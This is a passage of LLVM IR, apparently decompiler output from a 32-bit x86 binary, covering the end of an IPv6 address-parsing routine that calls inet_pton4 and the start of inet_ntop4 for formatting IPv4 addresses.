  store i32 %v0_804d3ac, i32* %v2_804d3ac, align 4
  %v3_804d3ac = load i32, i32* %edi.global-to-local, align 4
  %v6_804d3ac = add i32 %v3_804d3ac, %v5_804d3aa
  store i32 %v6_804d3ac, i32* %edi.global-to-local, align 4
  %v0_804d3ad = load i32, i32* %eax.global-to-local, align 4
  %v2_804d3ad = inttoptr i32 %v6_804d3ac to i32*
  store i32 %v0_804d3ad, i32* %v2_804d3ad, align 4
  %v3_804d3ad = load i32, i32* %edi.global-to-local, align 4
  %v6_804d3ad = add i32 %v3_804d3ad, %v5_804d3aa
  store i32 %v6_804d3ad, i32* %edi.global-to-local, align 4
  %v0_804d3ae = load i32, i32* @esi, align 4
  %v1_804d3ae = inttoptr i32 %v0_804d3ae to i8*
  %v2_804d3ae = load i8, i8* %v1_804d3ae, align 1
  %v11_804d3ae = icmp eq i8 %v2_804d3ae, 58
  %v1_804d3b1 = icmp eq i1 %v11_804d3ae, false
  br i1 %v1_804d3b1, label %dec_label_pc_804d3bd, label %dec_label_pc_804d3b3

dec_label_pc_804d3b3:                             ; preds = %dec_label_pc_804d3a2
  %v1_804d3b3 = add i32 %v0_804d3ae, 1
  store i32 %v1_804d3b3, i32* %esi.global-to-local, align 4
  %v1_804d3b4 = inttoptr i32 %v1_804d3b3 to i8*
  %v2_804d3b4 = load i8, i8* %v1_804d3b4, align 1
  %v11_804d3b4 = icmp eq i8 %v2_804d3b4, 58
  %v1_804d3b7 = icmp eq i1 %v11_804d3b4, false
  br i1 %v1_804d3b7, label %dec_label_pc_804d52c, label %dec_label_pc_804d3bd

dec_label_pc_804d3bd:                             ; preds = %dec_label_pc_804d3b3, %dec_label_pc_804d3a2
  %v0_804d3bd = phi i32 [ %v1_804d3b3, %dec_label_pc_804d3b3 ], [ %v0_804d3ae, %dec_label_pc_804d3a2 ]
  %tmp57 = bitcast i32* %stack_var_-32 to i8*
  store i32 0, i32* %stack_var_-48, align 4
  store i32 0, i32* @ebp, align 4
  %v1_804d4aa86101118 = inttoptr i32 %v0_804d3bd to i8*
  %v2_804d4aa87102119 = load i8, i8* %v1_804d4aa86101118, align 1
  %v3_804d4aa88103120 = zext i8 %v2_804d4aa87102119 to i32
  %v4_804d4aa89104121 = load i32, i32* @ebx, align 4
  %v5_804d4aa90105122 = and i32 %v4_804d4aa89104121, -256
  %v6_804d4aa91106123 = or i32 %v5_804d4aa90105122, %v3_804d4aa88103120
  store i32 %v6_804d4aa91106123, i32* @ebx, align 4
  %v4_804d4ac92107124 = icmp eq i8 %v2_804d4aa87102119, 0
  %v1_804d4ae93108125 = icmp eq i1 %v4_804d4ac92107124, false
  br i1 %v1_804d4ae93108125, label %dec_label_pc_804d3db.lr.ph.lr.ph, label %dec_label_pc_804d4b4.thread

dec_label_pc_804d3db.lr.ph.lr.ph:                 ; preds = %dec_label_pc_804d3bd, %dec_label_pc_804d424
  %v3_804d4aa88103129 = phi i32 [ %v3_804d4aa88103, %dec_label_pc_804d424 ], [ %v3_804d4aa88103120, %dec_label_pc_804d3bd ]
  %stack_var_-36.0.ph.in128 = phi i32 [ %v0_804d42c, %dec_label_pc_804d424 ], [ %v0_804d3bd, %dec_label_pc_804d3bd ]
  %stack_var_-40.0.ph126 = phi i8* [ %stack_var_-44.0.ph4109, %dec_label_pc_804d424 ], [ null, %dec_label_pc_804d3bd ]
  %stack_var_-44.0.ph127 = phi i8* [ %stack_var_-44.0.ph4109, %dec_label_pc_804d424 ], [ %tmp57, %dec_label_pc_804d3bd ]
  br label %dec_label_pc_804d3db.lr.ph

dec_label_pc_804d3db.lr.ph:                       ; preds = %dec_label_pc_804d3db.lr.ph.lr.ph, %dec_label_pc_804d44e
  %v3_804d4aa88111 = phi i32 [ %v3_804d4aa88103129, %dec_label_pc_804d3db.lr.ph.lr.ph ], [ %v3_804d4aa88, %dec_label_pc_804d44e ]
  %stack_var_-36.0.ph5.in110 = phi i32 [ %stack_var_-36.0.ph.in128, %dec_label_pc_804d3db.lr.ph.lr.ph ], [ %v0_804d462, %dec_label_pc_804d44e ]
  %stack_var_-44.0.ph4109 = phi i8* [ %stack_var_-44.0.ph127, %dec_label_pc_804d3db.lr.ph.lr.ph ], [ %v5_804d45e, %dec_label_pc_804d44e ]
  br label %dec_label_pc_804d3db

dec_label_pc_804d3db:                             ; preds = %dec_label_pc_804d3db.lr.ph, %dec_label_pc_804d4a3
  %v3_804d4aa95 = phi i32 [ %v3_804d4aa88111, %dec_label_pc_804d3db.lr.ph ], [ %v3_804d4aa, %dec_label_pc_804d4a3 ]
  %v0_804d3db94 = phi i32 [ %stack_var_-36.0.ph5.in110, %dec_label_pc_804d3db.lr.ph ], [ %v0_804d4aa.pre, %dec_label_pc_804d4a3 ]
  %v1_804d3db = add i32 %v0_804d3db94, 1
  store i32 %v1_804d3db, i32* @esi, align 4
  %v1_804d3df = or i32 %v3_804d4aa95, 32
  store i32 %v1_804d3df, i32* %eax.global-to-local, align 4
  %v4_804d3e8 = call i32 @__GI_strchr(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @global_var_80512b0.101, i32 0, i32 0), i32 %v1_804d3df)
  store i32 %v4_804d3e8, i32* %eax.global-to-local, align 4
  store i32 ptrtoint ([17 x i8]* @global_var_80512b0.101 to i32), i32* @ecx, align 4
  store i32 %v1_804d3df, i32* %edi.global-to-local, align 4
  %v1_804d3ef = icmp eq i32 %v4_804d3e8, 0
  br i1 %v1_804d3ef, label %dec_label_pc_804d40e, label %dec_label_pc_804d3f3

dec_label_pc_804d3f3:                             ; preds = %dec_label_pc_804d3db
  %v0_804d3f3 = load i32, i32* @ebp, align 4
  %v2_804d3f3 = mul i32 %v0_804d3f3, 16
  %v1_804d3f6 = add i32 %v4_804d3e8, -134550192
  store i32 %v1_804d3f6, i32* %eax.global-to-local, align 4
  %v2_804d3fb = or i32 %v2_804d3f3, %v1_804d3f6
  store i32 %v2_804d3fb, i32* @ebp, align 4
  %tmp166 = icmp ult i32 %v2_804d3fb, 65536
  br i1 %tmp166, label %dec_label_pc_804d4a3, label %dec_label_pc_804d52c

dec_label_pc_804d40e:                             ; preds = %dec_label_pc_804d3db
  %v0_804d40e = load i32, i32* @ebx, align 4
  %v1_804d40e = trunc i32 %v0_804d40e to i8
  %v10_804d40e = icmp eq i8 %v1_804d40e, 58
  %v1_804d411 = icmp eq i1 %v10_804d40e, false
  br i1 %v1_804d411, label %dec_label_pc_804d471, label %dec_label_pc_804d413

dec_label_pc_804d413:                             ; preds = %dec_label_pc_804d40e
  %v2_804d413 = load i32, i32* %stack_var_-48, align 4
  %v3_804d413 = icmp eq i32 %v2_804d413, 0
  %v1_804d417 = icmp eq i1 %v3_804d413, false
  br i1 %v1_804d417, label %dec_label_pc_804d432, label %dec_label_pc_804d419

dec_label_pc_804d419:                             ; preds = %dec_label_pc_804d413
  %v5_804d419 = icmp eq i8* %stack_var_-40.0.ph126, null
  %v1_804d41e = icmp eq i1 %v5_804d419, false
  br i1 %v1_804d41e, label %dec_label_pc_804d52c, label %dec_label_pc_804d424

dec_label_pc_804d424:                             ; preds = %dec_label_pc_804d419
  %v4_804d424 = ptrtoint i8* %stack_var_-44.0.ph4109 to i32
  store i32 %v4_804d424, i32* %eax.global-to-local, align 4
  %v0_804d42c = load i32, i32* @esi, align 4
  %v1_804d4aa86101 = inttoptr i32 %v0_804d42c to i8*
  %v2_804d4aa87102 = load i8, i8* %v1_804d4aa86101, align 1
  %v3_804d4aa88103 = zext i8 %v2_804d4aa87102 to i32
  %v5_804d4aa90105 = and i32 %v0_804d40e, -256
  %v6_804d4aa91106 = or i32 %v5_804d4aa90105, %v3_804d4aa88103
  store i32 %v6_804d4aa91106, i32* @ebx, align 4
  %v4_804d4ac92107 = icmp eq i8 %v2_804d4aa87102, 0
  %v1_804d4ae93108 = icmp eq i1 %v4_804d4ac92107, false
  br i1 %v1_804d4ae93108, label %dec_label_pc_804d3db.lr.ph.lr.ph, label %dec_label_pc_804d4b4

dec_label_pc_804d432:                             ; preds = %dec_label_pc_804d413
  %v0_804d432 = load i32, i32* @esi, align 4
  %v1_804d432 = inttoptr i32 %v0_804d432 to i8*
  %v2_804d432 = load i8, i8* %v1_804d432, align 1
  %v3_804d432 = icmp eq i8 %v2_804d432, 0
  br i1 %v3_804d432, label %dec_label_pc_804d52c, label %dec_label_pc_804d43b

dec_label_pc_804d43b:                             ; preds = %dec_label_pc_804d432
  %v4_804d43b = ptrtoint i8* %stack_var_-44.0.ph4109 to i32
  %v1_804d43f = add i32 %v4_804d43b, 2
  store i32 %v1_804d43f, i32* %edx.global-to-local, align 4
  store i32 %v4_804d376, i32* @ecx, align 4
  %v6_804d448 = icmp ugt i32 %v1_804d43f, %v4_804d376
  br i1 %v6_804d448, label %dec_label_pc_804d52c, label %dec_label_pc_804d44e

dec_label_pc_804d44e:                             ; preds = %dec_label_pc_804d43b
  %v0_804d44e = load i32, i32* @ebp, align 4
  %v2_804d450 = udiv i32 %v0_804d44e, 256
  %v4_804d450 = trunc i32 %v2_804d450 to i8
  store i32 %v4_804d43b, i32* @ecx, align 4
  store i8 %v4_804d450, i8* %stack_var_-44.0.ph4109, align 1
  %v0_804d459 = load i32, i32* @ebp, align 4
  store i32 %v0_804d459, i32* %eax.global-to-local, align 4
  %v1_804d45b = trunc i32 %v0_804d459 to i8
  %v2_804d45b = load i32, i32* @ecx, align 4
  %v3_804d45b = add i32 %v2_804d45b, 1
  %v4_804d45b = inttoptr i32 %v3_804d45b to i8*
  store i8 %v1_804d45b, i8* %v4_804d45b, align 1
  %v0_804d45e = load i32, i32* %edx.global-to-local, align 4
  %v5_804d45e = inttoptr i32 %v0_804d45e to i8*
  %v0_804d462 = load i32, i32* @esi, align 4
  store i32 0, i32* %stack_var_-48, align 4
  store i32 0, i32* @ebp, align 4
  %v1_804d4aa86 = inttoptr i32 %v0_804d462 to i8*
  %v2_804d4aa87 = load i8, i8* %v1_804d4aa86, align 1
  %v3_804d4aa88 = zext i8 %v2_804d4aa87 to i32
  %v4_804d4aa89 = load i32, i32* @ebx, align 4
  %v5_804d4aa90 = and i32 %v4_804d4aa89, -256
  %v6_804d4aa91 = or i32 %v5_804d4aa90, %v3_804d4aa88
  store i32 %v6_804d4aa91, i32* @ebx, align 4
  %v4_804d4ac92 = icmp eq i8 %v2_804d4aa87, 0
  %v1_804d4ae93 = icmp eq i1 %v4_804d4ac92, false
  br i1 %v1_804d4ae93, label %dec_label_pc_804d3db.lr.ph, label %dec_label_pc_804d4b4.thread

dec_label_pc_804d471:                             ; preds = %dec_label_pc_804d40e
  %v10_804d471 = icmp eq i8 %v1_804d40e, 46
  %v1_804d474 = icmp eq i1 %v10_804d471, false
  br i1 %v1_804d474, label %dec_label_pc_804d52c, label %dec_label_pc_804d47a

dec_label_pc_804d47a:                             ; preds = %dec_label_pc_804d471
  %v4_804d47a = ptrtoint i8* %stack_var_-44.0.ph4109 to i32
  %v1_804d47e = add i32 %v4_804d47a, 4
  store i32 %v1_804d47e, i32* @edi, align 4
  store i32 %v4_804d376, i32* %edx.global-to-local, align 4
  %v6_804d487 = icmp ugt i32 %v1_804d47e, %v4_804d376
  br i1 %v6_804d487, label %dec_label_pc_804d52c, label %dec_label_pc_804d48d

dec_label_pc_804d48d:                             ; preds = %dec_label_pc_804d47a
  store i32 %v4_804d47a, i32* @edx, align 4
  store i32 %stack_var_-36.0.ph5.in110, i32* @eax, align 4
  %v0_804d495 = load i32, i32* %stack_var_-48, align 4
  %v4_804d495 = ptrtoint i8* %stack_var_-40.0.ph126 to i32
  %v5_804d495 = call i32 @inet_pton4(i32 %v0_804d495, i32 %v4_804d47a, i32 %v4_804d495)
  store i32 %v5_804d495, i32* %eax.global-to-local, align 4
  %tmp58 = icmp slt i32 %v5_804d495, 1
  %tmp59 = icmp eq i1 %tmp58, false
  br i1 %tmp59, label %dec_label_pc_804d48d.dec_label_pc_804d4d7_crit_edge, label %dec_label_pc_804d52c

dec_label_pc_804d48d.dec_label_pc_804d4d7_crit_edge: ; preds = %dec_label_pc_804d48d
  %v0_804d519.pre.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_804d4d7

dec_label_pc_804d4a3:                             ; preds = %dec_label_pc_804d3f3
  store i32 1, i32* %stack_var_-48, align 4
  %v0_804d4aa.pre = load i32, i32* @esi, align 4
  %v1_804d4aa = inttoptr i32 %v0_804d4aa.pre to i8*
  %v2_804d4aa = load i8, i8* %v1_804d4aa, align 1
  %v3_804d4aa = zext i8 %v2_804d4aa to i32
  %v4_804d4aa = load i32, i32* @ebx, align 4
  %v5_804d4aa = and i32 %v4_804d4aa, -256
  %v6_804d4aa = or i32 %v5_804d4aa, %v3_804d4aa
  store i32 %v6_804d4aa, i32* @ebx, align 4
  %v4_804d4ac = icmp eq i8 %v2_804d4aa, 0
  %v1_804d4ae = icmp eq i1 %v4_804d4ac, false
  br i1 %v1_804d4ae, label %dec_label_pc_804d3db, label %dec_label_pc_804d4b4.thread160

dec_label_pc_804d4b4.thread160:                   ; preds = %dec_label_pc_804d4a3
  %v4_804d4b4161 = ptrtoint i8* %stack_var_-44.0.ph4109 to i32
  store i32 %v4_804d4b4161, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804d4be

dec_label_pc_804d4b4.thread:                      ; preds = %dec_label_pc_804d3bd, %dec_label_pc_804d44e
  %stack_var_-40.0.ph.lcssa.ph = phi i8* [ %stack_var_-40.0.ph126, %dec_label_pc_804d44e ], [ null, %dec_label_pc_804d3bd ]
  %stack_var_-44.0.ph4.lcssa.ph = phi i8* [ %v5_804d45e, %dec_label_pc_804d44e ], [ %tmp57, %dec_label_pc_804d3bd ]
  %v4_804d4b4158 = ptrtoint i8* %stack_var_-44.0.ph4.lcssa.ph to i32
  store i32 %v4_804d4b4158, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804d4d7

dec_label_pc_804d4b4:                             ; preds = %dec_label_pc_804d424
  %v4_804d4b4 = ptrtoint i8* %stack_var_-44.0.ph4109 to i32
  store i32 %v4_804d4b4, i32* %edi.global-to-local, align 4
  %v3_804d4b8 = icmp eq i32 %v2_804d413, 0
  br i1 %v3_804d4b8, label %dec_label_pc_804d4d7, label %dec_label_pc_804d4be

dec_label_pc_804d4be:                             ; preds = %dec_label_pc_804d4b4.thread160, %dec_label_pc_804d4b4
  %v4_804d4b4165 = phi i32 [ %v4_804d4b4161, %dec_label_pc_804d4b4.thread160 ], [ %v4_804d4b4, %dec_label_pc_804d4b4 ]
  %stack_var_-40.0.ph.lcssa163 = phi i8* [ %stack_var_-40.0.ph126, %dec_label_pc_804d4b4.thread160 ], [ %stack_var_-44.0.ph4109, %dec_label_pc_804d4b4 ]
  %v1_804d4be = add i32 %v4_804d4b4165, 2
  store i32 %v1_804d4be, i32* %edx.global-to-local, align 4
  store i32 %v4_804d376, i32* @ecx, align 4
  %v6_804d4c7 = icmp ugt i32 %v1_804d4be, %v4_804d376
  br i1 %v6_804d4c7, label %dec_label_pc_804d52c, label %dec_label_pc_804d4c9

dec_label_pc_804d4c9:                             ; preds = %dec_label_pc_804d4be
  %v0_804d4c9 = load i32, i32* @ebp, align 4
  %v2_804d4cb = udiv i32 %v0_804d4c9, 256
  %v4_804d4cb = trunc i32 %v2_804d4cb to i8
  store i8 %v4_804d4cb, i8* %stack_var_-44.0.ph4109, align 1
  %v0_804d4d0 = load i32, i32* @ebp, align 4
  store i32 %v0_804d4d0, i32* %eax.global-to-local, align 4
  %v1_804d4d2 = trunc i32 %v0_804d4d0 to i8
  %v2_804d4d2 = load i32, i32* %edi.global-to-local, align 4
  %v3_804d4d2 = add i32 %v2_804d4d2, 1
  %v4_804d4d2 = inttoptr i32 %v3_804d4d2 to i8*
  store i8 %v1_804d4d2, i8* %v4_804d4d2, align 1
  %v0_804d4d5 = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_804d4d5, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804d4d7

dec_label_pc_804d4d7:                             ; preds = %dec_label_pc_804d4b4.thread, %dec_label_pc_804d48d.dec_label_pc_804d4d7_crit_edge, %dec_label_pc_804d4b4, %dec_label_pc_804d4c9
  %v0_804d519.pre = phi i32 [ %v4_804d4b4, %dec_label_pc_804d4b4 ], [ %v0_804d519.pre.pre, %dec_label_pc_804d48d.dec_label_pc_804d4d7_crit_edge ], [ %v0_804d4d5, %dec_label_pc_804d4c9 ], [ %v4_804d4b4158, %dec_label_pc_804d4b4.thread ]
  %stack_var_-40.0.ph81 = phi i8* [ %stack_var_-44.0.ph4109, %dec_label_pc_804d4b4 ], [ %stack_var_-40.0.ph126, %dec_label_pc_804d48d.dec_label_pc_804d4d7_crit_edge ], [ %stack_var_-40.0.ph.lcssa163, %dec_label_pc_804d4c9 ], [ %stack_var_-40.0.ph.lcssa.ph, %dec_label_pc_804d4b4.thread ]
  %v4_804d4d7 = ptrtoint i8* %stack_var_-40.0.ph81 to i32
  %v5_804d4d7 = icmp eq i8* %stack_var_-40.0.ph81, null
  br i1 %v5_804d4d7, label %dec_label_pc_804d511, label %dec_label_pc_804d4de

dec_label_pc_804d4de:                             ; preds = %dec_label_pc_804d4d7
  %v6_804d4e0 = sub i32 %v0_804d519.pre, %v4_804d4d7
  store i32 %v6_804d4e0, i32* %esi.global-to-local, align 4
  store i32 1, i32* %ebx.global-to-local, align 4
  store i32 %v4_804d376, i32* %edx.global-to-local, align 4
  %v12_804d4ed = icmp eq i32 %v0_804d519.pre, %v4_804d376
  %v1_804d4ef = icmp eq i1 %v12_804d4ed, false
  br i1 %v1_804d4ef, label %dec_label_pc_804d509.preheader, label %dec_label_pc_804d52c

dec_label_pc_804d509.preheader:                   ; preds = %dec_label_pc_804d4de
  %v7_804d50b83 = icmp slt i32 %v6_804d4e0, 1
  br i1 %v7_804d50b83, label %dec_label_pc_804d511.thread, label %dec_label_pc_804d4f3

dec_label_pc_804d4f3:                             ; preds = %dec_label_pc_804d509.preheader, %dec_label_pc_804d4f3.dec_label_pc_804d4f3_crit_edge
  %v4_804d501 = phi i32 [ %v4_804d501.pre, %dec_label_pc_804d4f3.dec_label_pc_804d4f3_crit_edge ], [ %v4_804d376, %dec_label_pc_804d509.preheader ]
  %v1_804d4ff85 = phi i32 [ %v1_804d508, %dec_label_pc_804d4f3.dec_label_pc_804d4f3_crit_edge ], [ 1, %dec_label_pc_804d509.preheader ]
  %v0_804d4f384 = phi i32 [ %v1_804d509.pre, %dec_label_pc_804d4f3.dec_label_pc_804d4f3_crit_edge ], [ %v6_804d4e0, %dec_label_pc_804d509.preheader ]
  %v2_804d4f5 = sub i32 %v0_804d4f384, %v1_804d4ff85
  %v6_804d4f7 = add i32 %v2_804d4f5, %v4_804d4d7
  store i32 %v6_804d4f7, i32* %eax.global-to-local, align 4
  %v2_804d4ff = sub i32 %v4_804d376, %v1_804d4ff85
  %v1_804d501 = inttoptr i32 %v6_804d4f7 to i8*
  %v2_804d501 = load i8, i8* %v1_804d501, align 1
  %v3_804d501 = zext i8 %v2_804d501 to i32
  %v5_804d501 = and i32 %v4_804d501, -256
  %v6_804d501 = or i32 %v5_804d501, %v3_804d501
  store i32 %v6_804d501, i32* %edx.global-to-local, align 4
  %v3_804d503 = inttoptr i32 %v2_804d4ff to i8*
  store i8 %v2_804d501, i8* %v3_804d503, align 1
  %v0_804d505 = load i32, i32* %eax.global-to-local, align 4
  %v1_804d505 = inttoptr i32 %v0_804d505 to i8*
  store i8 0, i8* %v1_804d505, align 1
  %v0_804d508 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804d508 = add i32 %v0_804d508, 1
  store i32 %v1_804d508, i32* %ebx.global-to-local, align 4
  %v1_804d509.pre = load i32, i32* %esi.global-to-local, align 4
  %v7_804d50b = icmp slt i32 %v1_804d509.pre, %v1_804d508
  br i1 %v7_804d50b, label %dec_label_pc_804d511.thread, label %dec_label_pc_804d4f3.dec_label_pc_804d4f3_crit_edge

dec_label_pc_804d4f3.dec_label_pc_804d4f3_crit_edge: ; preds = %dec_label_pc_804d4f3
  %v4_804d501.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804d4f3

dec_label_pc_804d511.thread:                      ; preds = %dec_label_pc_804d4f3, %dec_label_pc_804d509.preheader
  store i32 %v4_804d376, i32* %edi.global-to-local, align 4
  store i32 %v2_804d3a4, i32* %esi.global-to-local, align 4
  store i32 %v4_804d376, i32* @ecx, align 4
  br label %dec_label_pc_804d51d

dec_label_pc_804d511:                             ; preds = %dec_label_pc_804d4d7
  store i32 %v2_804d3a4, i32* %esi.global-to-local, align 4
  store i32 %v4_804d376, i32* @ecx, align 4
  %v12_804d519 = icmp eq i32 %v0_804d519.pre, %v4_804d376
  %v1_804d51b = icmp eq i1 %v12_804d519, false
  br i1 %v1_804d51b, label %dec_label_pc_804d52c, label %dec_label_pc_804d51d

dec_label_pc_804d51d:                             ; preds = %dec_label_pc_804d511.thread, %dec_label_pc_804d511
  store i32 %tmp45, i32* %edi.global-to-local, align 4
  %v2_804d521 = load i32, i32* %stack_var_-32, align 4
  %v4_804d521 = inttoptr i32 %tmp45 to i32*
  store i32 %v2_804d521, i32* %v4_804d521, align 4
  %v5_804d521 = load i32, i32* %edi.global-to-local, align 4
  %v6_804d521 = load i32, i32* %esi.global-to-local, align 4
  %v7_804d521 = load i1, i1* @df, align 1
  %v8_804d521 = select i1 %v7_804d521, i32 -4, i32 4
  %v9_804d521 = add i32 %v8_804d521, %v5_804d521
  %v10_804d521 = add i32 %v8_804d521, %v6_804d521
  store i32 %v9_804d521, i32* %edi.global-to-local, align 4
  store i32 %v10_804d521, i32* %esi.global-to-local, align 4
  %v1_804d522 = inttoptr i32 %v10_804d521 to i32*
  %v2_804d522 = load i32, i32* %v1_804d522, align 4
  %v4_804d522 = inttoptr i32 %v9_804d521 to i32*
  store i32 %v2_804d522, i32* %v4_804d522, align 4
  %v5_804d522 = load i32, i32* %edi.global-to-local, align 4
  %v6_804d522 = load i32, i32* %esi.global-to-local, align 4
  %v9_804d522 = add i32 %v5_804d522, %v8_804d521
  %v10_804d522 = add i32 %v6_804d522, %v8_804d521
  store i32 %v9_804d522, i32* %edi.global-to-local, align 4
  store i32 %v10_804d522, i32* %esi.global-to-local, align 4
  %v1_804d523 = inttoptr i32 %v10_804d522 to i32*
  %v2_804d523 = load i32, i32* %v1_804d523, align 4
  %v4_804d523 = inttoptr i32 %v9_804d522 to i32*
  store i32 %v2_804d523, i32* %v4_804d523, align 4
  %v5_804d523 = load i32, i32* %edi.global-to-local, align 4
  %v6_804d523 = load i32, i32* %esi.global-to-local, align 4
  %v9_804d523 = add i32 %v5_804d523, %v8_804d521
  %v10_804d523 = add i32 %v6_804d523, %v8_804d521
  store i32 %v9_804d523, i32* %edi.global-to-local, align 4
  store i32 %v10_804d523, i32* %esi.global-to-local, align 4
  %v1_804d524 = inttoptr i32 %v10_804d523 to i32*
  %v2_804d524 = load i32, i32* %v1_804d524, align 4
  %v4_804d524 = inttoptr i32 %v9_804d523 to i32*
  store i32 %v2_804d524, i32* %v4_804d524, align 4
  %v5_804d524 = load i32, i32* %edi.global-to-local, align 4
  %v6_804d524 = load i32, i32* %esi.global-to-local, align 4
  %v9_804d524 = add i32 %v5_804d524, %v8_804d521
  %v10_804d524 = add i32 %v6_804d524, %v8_804d521
  store i32 %v9_804d524, i32* %edi.global-to-local, align 4
  store i32 %v10_804d524, i32* %esi.global-to-local, align 4
  store i32 1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d53e

dec_label_pc_804d52c:                             ; preds = %dec_label_pc_804d419, %dec_label_pc_804d43b, %dec_label_pc_804d432, %dec_label_pc_804d3f3, %dec_label_pc_804d4de, %dec_label_pc_804d48d, %dec_label_pc_804d511, %dec_label_pc_804d4be, %dec_label_pc_804d47a, %dec_label_pc_804d471, %dec_label_pc_804d3b3
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d53e

dec_label_pc_804d530:                             ; preds = %dec_label_pc_804d387
  %v1_804d530 = call i32 @__GI___errno_location(i32 %v0_804d376)
  %v1_804d535 = inttoptr i32 %v1_804d530 to i32*
  store i32 97, i32* %v1_804d535, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d53e

dec_label_pc_804d53e:                             ; preds = %dec_label_pc_804d52c, %dec_label_pc_804d51d, %dec_label_pc_804d392, %dec_label_pc_804d530
  %v0_804d545 = phi i32 [ 0, %dec_label_pc_804d52c ], [ 1, %dec_label_pc_804d51d ], [ %v3_804d398, %dec_label_pc_804d392 ], [ -1, %dec_label_pc_804d530 ]
  %v2_804d541 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804d541, i32* @ebx, align 4
  store i32 %v0_804d375, i32* @esi, align 4
  store i32 %v0_804d374, i32* @edi, align 4
  store i32 %v0_804d373, i32* @ebp, align 4
  ret i32 %v0_804d545

; uselistorder directives
  uselistorder i32 %v1_804d509.pre, { 1, 0 }
  uselistorder i32 %v1_804d508, { 1, 2, 0 }
  uselistorder i32 %v1_804d4ff85, { 1, 0 }
  uselistorder i8* %stack_var_-40.0.ph81, { 1, 0 }
  uselistorder i32 %v0_804d519.pre, { 2, 1, 0 }
  uselistorder i32 %v4_804d4b4, { 1, 0, 2 }
  uselistorder i32 %v3_804d4aa, { 1, 0 }
  uselistorder i32 %v3_804d4aa88, { 1, 0 }
  uselistorder i32 %v3_804d4aa88103, { 1, 0 }
  uselistorder i32 %v0_804d42c, { 1, 0 }
  uselistorder i8* %stack_var_-44.0.ph4109, { 2, 0, 3, 1, 4, 7, 9, 10, 8, 5, 6 }
  uselistorder i8* %stack_var_-40.0.ph126, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v2_804d3a4, { 2, 1, 0, 3 }
  uselistorder i32 %v4_804d376, { 2, 11, 1, 9, 8, 0, 3, 10, 6, 7, 4, 13, 5, 12 }
  uselistorder i32 %v0_804d376, { 1, 0, 2 }
  uselistorder i32* %stack_var_-16, { 0, 2, 1 }
  uselistorder i32* %stack_var_-48, { 1, 0, 2, 3, 4 }
  uselistorder i32* %stack_var_-32, { 1, 0, 2, 3 }
  uselistorder i32 %tmp45, { 2, 1, 0 }
  uselistorder i32* %esi.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 11, 7, 12, 8, 9, 10 }
  uselistorder i32* %edi.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 0, 1, 15, 16, 17, 18, 19, 20, 21, 22 }
  uselistorder i32 (i32, i32, i32)* @inet_pton4, { 1, 0 }
  uselistorder label %dec_label_pc_804d53e, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_804d52c, { 6, 4, 7, 5, 8, 9, 1, 2, 0, 3, 10 }
  uselistorder label %dec_label_pc_804d51d, { 1, 0 }
  uselistorder label %dec_label_pc_804d4f3, { 1, 0 }
  uselistorder label %dec_label_pc_804d4d7, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_804d4be, { 1, 0 }
  uselistorder label %dec_label_pc_804d4b4.thread, { 1, 0 }
  uselistorder label %dec_label_pc_804d3db, { 1, 0 }
  uselistorder label %dec_label_pc_804d3db.lr.ph, { 1, 0 }
  uselistorder label %dec_label_pc_804d3db.lr.ph.lr.ph, { 1, 0 }
}

define i32 @inet_ntop4(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-33 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %v0_804d547 = load i32, i32* @edi, align 4
  %v0_804d548 = load i32, i32* @esi, align 4
  %v15_804d54a = ptrtoint i32* %stack_var_-52 to i32
  %v0_804d54d = load i32, i32* @eax, align 4
  %v0_804d551 = load i32, i32* @edx, align 4
  %v0_804d555 = load i32, i32* @ecx, align 4
  store i32 %v0_804d555, i32* %stack_var_-52, align 4
  store i32 0, i32* %stack_var_-33, align 4
  store i32 0, i32* %ebp.global-to-local, align 4
  store i32 0, i32* @esi, align 4
  br label %dec_label_pc_804d566

dec_label_pc_804d566:                             ; preds = %dec_label_pc_804d5cb.dec_label_pc_804d566_crit_edge, %entry
  %v2_804d57e = phi i32 [ %v15_804d54a, %entry ], [ %v2_804d57e.pre, %dec_label_pc_804d5cb.dec_label_pc_804d566_crit_edge ]
  %v0_804d573 = phi i32 [ %v0_804d555, %entry ], [ %v0_804d573.pre, %dec_label_pc_804d5cb.dec_label_pc_804d566_crit_edge ]
  %v1_804d56a23 = phi i32 [ 0, %entry ], [ %v1_804d5eb, %dec_label_pc_804d5cb.dec_label_pc_804d566_crit_edge ]
  %v1_804d5f522 = phi i32 [ 0, %entry ], [ %v1_804d5e8, %dec_label_pc_804d5cb.dec_label_pc_804d566_crit_edge ]
  %v2_804d56a = add i32 %v1_804d56a23, %v0_804d54d
  store i32 %v2_804d56a, i32* %eax.global-to-local, align 4
  %v5_804d56c = inttoptr i32 %v2_804d56a to i8*
  %v2_804d570 = load i8, i8* %v5_804d56c, align 1
  %v3_804d570 = zext i8 %v2_804d570 to i32
  store i32 %v3_804d570, i32* %edx.global-to-local, align 4
  %v1_804d573 = and i32 %v0_804d573, -256
  %div = udiv i8 %v2_804d570, 100
  %v6_804d577 = zext i8 %div to i32
  %v4_804d579 = or i32 %v6_804d577, %v1_804d573
  %v1_804d57b = or i32 %v4_804d579, 48
  store i32 %v1_804d57b, i32* %eax.global-to-local, align 4
  %v1_804d57e = trunc i32 %v1_804d57b to i8
  %v4_804d57e = add i32 %v1_804d5f522, 19
